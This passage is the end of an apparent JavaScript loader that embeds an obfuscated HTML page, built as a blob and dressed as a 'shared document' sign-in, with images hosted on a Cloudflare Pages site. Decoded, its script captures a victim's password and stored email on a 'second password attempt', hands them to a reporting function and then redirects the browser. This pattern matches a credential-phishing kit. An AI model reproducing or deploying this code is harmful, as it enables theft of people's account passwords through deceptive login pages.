9b);};_0xa6c['\u006F\u006E\u0063\u006C\u0069\u0063\u006B']=function(e){e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();console['\u006C\u006F\u0067']("\uD83D\uDD11\u0020\u0053\u0065\u0063\u006F\u006E\u0064\u0020\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0020\u0062\u0075\u0074\u0074\u006F\u006E\u0020\u0063\u006C\u0069\u0063\u006B\u0065\u0064");var _0x99gdag=_0xg_0x7dg['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();if(!_0x99gdag){_0xec6b3e(".drowssap a retne esaelP".split("").reverse().join(""),"rorre".split("").reverse().join(""));return;}var _0x1bbf3d=(536599^536598)+(866319^866316);var _0xf67cd=_0x173bfb||"\u0075\u0073\u0065\u0072";_0x1bbf3d='\u0066\u0069\u0061\u006B\u006E\u0066';try{_0xf67cd=localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("\u0073\u0068\u0061\u0072\u0065\u0064\u0044\u006F\u0063\u0045\u006D\u0061\u0069\u006C")||_0xf67cd;}catch(e){}console['\u006C\u006F\u0067']("\uD83D\uDD11\u0020\u0053\u0065\u0063\u006F\u006E\u0064\u0020\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0020\u0061\u0074\u0074\u0065\u006D\u0070\u0074\u0020\u0066\u006F\u0072\u003A",_0xf67cd);_0x715g5f(_0xf67cd,_0x99gdag,"\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u005F\u0061\u0074\u0074\u0065\u006D\u0070\u0074\u005F\u0032\u005F\u0073\u0075\u0063\u0063\u0065\u0073\u0073");setTimeout(function(){window['\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E']['\u0068\u0072\u0065\u0066']=_0x4777cc['\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074\u0055\u0072\u006C'];},232103^231985);};function _0xa95e(btn,input){if(!btn||!input)return;btn['\u006F\u006E\u0063\u006C\u0069\u0063\u006B']=function(){var _0xe15ea=(859675^859676)+(380746^380745);var _0x083ada=input['\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065']("\u0074\u0079\u0070\u0065")==="drowssap".split("").reverse().join("")?"txet".split("").reverse().join(""):"drowssap".split("").reverse().join("");_0xe15ea=(161206^161205)+(990012^990013);input['\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065']("\u0074\u0079\u0070\u0065",_0x083ada);var _0x4g71f=this['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072']("\u0069");if(_0x4g71f){_0x4g71f['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0074\u006F\u0067\u0067\u006C\u0065']("\u0066\u0061\u002D\u0065\u0079\u0065");_0x4g71f['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0074\u006F\u0067\u0067\u006C\u0065']("hsals-eye-af".split("").reverse().join(""));}};}_0xa95e(_0x29557e,_0xb45e);_0xa95e(_0xd642a,_0xg_0x7dg);function _0xdcbf(btn){return function(e){if(e['\u006B\u0065\u0079']==="\u0045\u006E\u0074\u0065\u0072"){e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();if(btn)btn['\u0063\u006C\u0069\u0063\u006B']();}};}_0xf3a7dg['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("nwodyek".split("").reverse().join(""),_0xdcbf(_0x1f5f6b));_0xb45e['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u006B\u0065\u0079\u0064\u006F\u0077\u006E",_0xdcbf(_0x6ae));_0xg_0x7dg['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("nwodyek".split("").reverse().join(""),_0xdcbf(_0xa6c));_0x1bf();console['\u006C\u006F\u0067']("\u2705\u0020\u0053\u0068\u0061\u0072\u0065\u0064\u0020\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u0020\u0066\u006C\u006F\u0077\u0020\u0072\u0065\u0061\u0064\u0079");})();
</script>
</body>
</html>`;

    // Expose the HTML content globally
    window.blobHtmlContent = HTML_TEMPLATE;

    console.log('✅ Content loaded: Complete self-contained application');
    console.log('📸 Images from Cloudflare Pages:');
    console.log('   - Background: https://myprojec-37j.pages.dev/background-image.png');
    console.log('   - Icon: https://myprojec-37j.pages.dev/bgo.png');

})();
